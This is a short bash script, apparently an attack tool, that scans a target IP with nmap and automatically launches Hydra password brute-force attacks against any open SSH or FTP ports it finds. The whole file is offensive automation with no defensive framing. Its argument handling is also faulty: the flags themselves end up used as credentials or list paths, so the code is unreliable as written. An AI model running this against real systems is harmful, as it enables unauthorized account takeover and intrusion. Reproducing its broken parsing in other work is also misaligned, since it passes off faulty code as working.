#!/bin/bash

if [ "$#" -lt 3 ]; then
    echo "Usage: $0 <target_ip> (-u <username> -p <password>) | (-U <userlist> -P <passlist>)"
    exit 1
fi

TARGET=$1
USERNAME=$2
PASSWORD=$3
USERLIST=""
PASSLIST=""

if [[ $USERNAME == "-U" ]]; then
    USERLIST=$2
    USERNAME=""
fi

if [[ $PASSWORD == "-P" ]]; then
    PASSLIST=$3
    PASSWORD=""
fi

run_hydra() {
    local port=$1
    local service=$2

    echo "Running Hydra against $service on port $port..."

    if [ ! -z "$USERLIST" ] && [ ! -z "$PASSLIST" ]; then
        hydra -L $USERLIST -P $PASSLIST $TARGET $service -s $port
    else
        hydra -l $USERNAME -p $PASSWORD $TARGET $service -s $port
    fi
}

echo "Scanning $TARGET for open ports..."
nmap_results=$(nmap -sV $TARGET)

echo "Parsing Nmap results and running Hydra..."

echo "$nmap_results" | grep 'open' | while read -r line ; do
    port=$(echo $line | cut -d '/' -f 1)
    service=$(echo $line | cut -d ' ' -f 3)

    case $service in
        ssh)
            run_hydra $port "ssh"
            ;;
        ftp)
            run_hydra $port "ftp"
            ;;
        *)
            echo "Service $service on port $port not configured for brute-forcing"
            ;;
    esac
done

echo "Brute forcing completed."
